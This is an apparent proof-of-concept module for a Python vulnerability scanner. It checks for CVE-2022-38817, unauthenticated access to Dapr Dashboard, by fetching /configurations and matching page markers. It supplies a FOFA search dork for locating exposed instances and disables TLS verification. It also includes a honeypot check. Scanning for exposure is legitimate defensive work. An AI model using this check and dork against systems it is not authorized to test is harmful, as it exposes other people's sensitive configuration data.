# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Dapr Dashboard未授权访问(CVE-2022-38817)",  # 漏洞名称
        "VulnID": "CVE-2022-38817",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Dapr",  # 漏洞应用名称
        "AppVersion": "Dapr v0.1.0~v0.10.0",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            Dapr Dashboard是Dapr开源的一个基于 Web 的 UI。
            允许用户查看本地或 Kubernetes 群集中运行的 Dapr 应用程序、组件和配置的信息、查看日志等。
            Dapr Dashboard v0.1.0版本至v0.10.0版本存在安全漏洞，该漏洞源于存在不正确访问控制的问题，允许攻击者获取敏感数据。
        """,  # 漏洞简要描述

        "fofa-dork": """
            "Dapr Dashboard"
            icon_hash="-1294239467"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/configurations"  # url自己按需调整

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            # "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if req.status_code == 200 and "<title>Dapr Dashboard</title>" in req.text and "<link rel=\"icon\" type=\"image/x-icon\" href=\"favicon.ico\">" in req.text:
                vuln = [True, req.text]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
